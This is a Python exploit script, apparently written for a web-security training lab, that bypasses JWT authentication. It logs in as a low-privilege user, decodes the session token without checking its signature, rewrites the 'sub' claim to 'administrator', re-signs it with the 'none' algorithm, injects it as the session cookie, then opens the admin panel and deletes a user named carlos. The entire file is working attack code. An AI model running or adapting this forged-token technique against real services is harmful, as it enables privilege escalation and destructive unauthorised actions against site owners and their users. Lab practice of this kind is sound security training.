import jwt
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from requests.exceptions import RequestException
from colorama import Fore

# Suppress insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
USERNAME = "wiener"
PASSWORD = "peter"
SECRET_KEY = None
LOGIN_PATH = "/login"
ADMIN_PATH = "/admin"
DELETE_USER_PATH = "/admin/delete?username=carlos"
SUCCESS_MESSAGE = "Congratulations, you solved the lab!"

def get_csrf_token(session, url):
    """
    Fetches CSRF token from the login page.
    """
    print(Fore.WHITE +"(+) Fetching CSRF token...")
    try:
        response = session.get(f"{url}{LOGIN_PATH}", verify=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find("input", {"name": "csrf"})["value"]
    except (RequestException, TypeError, KeyError) as e:
        print(f"(-) Failed to fetch CSRF token: {e}")
        sys.exit(1)

def login_user(session, url, username, password):
    """
    Logs in the user and returns the session token if successful.
    """
    csrf_token = get_csrf_token(session, url)
    print("\n(👀) Attempting to log in...\n")
    login_data = {"username": username, "password": password, "csrf": csrf_token}
    
    try:
        response = session.post(f"{url}{LOGIN_PATH}", data=login_data, verify=False, allow_redirects=False)
        response.raise_for_status()
        
        if "Set-Cookie" in response.headers:
            print("(😎) Login successful.\n")
            set_cookie = response.headers.get("Set-Cookie", "")
            return set_cookie.split("session=")[1].split(";")[0]
        else:
            print("[😞] Failed to log in: Session cookie not found.")
            sys.exit(1)
    except RequestException as e:
        print(f"(-) Login request failed: {e}")
        sys.exit(1)

def create_admin_token(session_token):
    """
    Creates an admin JWT token by modifying the 'sub' claim.
    """
    decoded_token = jwt.decode(session_token, options={"verify_signature": False})
    decoded_token["sub"] = "administrator"

    return jwt.encode(decoded_token, SECRET_KEY, algorithm="none")

def perform_admin_actions(session, url, admin_token):
    """
    Logs in as an administrator and deletes the target user.
    """
    print("(+) Injecting admin JWT token...")
    cookies = {"session": admin_token}
    
    try:
        response = session.get(f"{url}{ADMIN_PATH}", cookies=cookies, verify=False)
        response.raise_for_status()

        if "Admin panel" in response.text:
            print("\n(+) Login as Administrator Successful!")
            print("(+) Deleting Carlos account...")
            response = session.get(f"{url}{DELETE_USER_PATH}", cookies=cookies, verify=False)
            
            if SUCCESS_MESSAGE in response.text:
                print("\n(🎉) Congratulations, you solved the lab!")
            else:
                print("\n(-) Failed to delete Carlos account.")
        else:
            print("\n(-) Failed to access Admin panel.")
    except RequestException as e:
        print(f"(-) Admin action failed: {e}")

def validate_target(url):
    """
    Validates if the target URL is reachable.
    """
    print(Fore.WHITE +"(🔍) Validating the target...")
    try:
        response = requests.get(url, verify=False, timeout=10)
        if response.status_code == 200:
            print("(+) Target is reachable.\n")
            return True
        else:
            print( Fore.RED+ f"(-) Target returned status code {response.status_code}.\n")
            return False
    except RequestException as e:
        print(f"(-) Target validation failed: {e}")
        return False

def main():
    # Argument validation
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} http://www.example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    session = requests.Session()

    # Validate target
    if not validate_target(url):
        sys.exit(1)

    # Log in and perform actions
    session_token = login_user(session, url, USERNAME, PASSWORD)
    admin_token = create_admin_token(session_token)
    perform_admin_actions(session, url, admin_token)

if __name__ == "__main__":
    main()

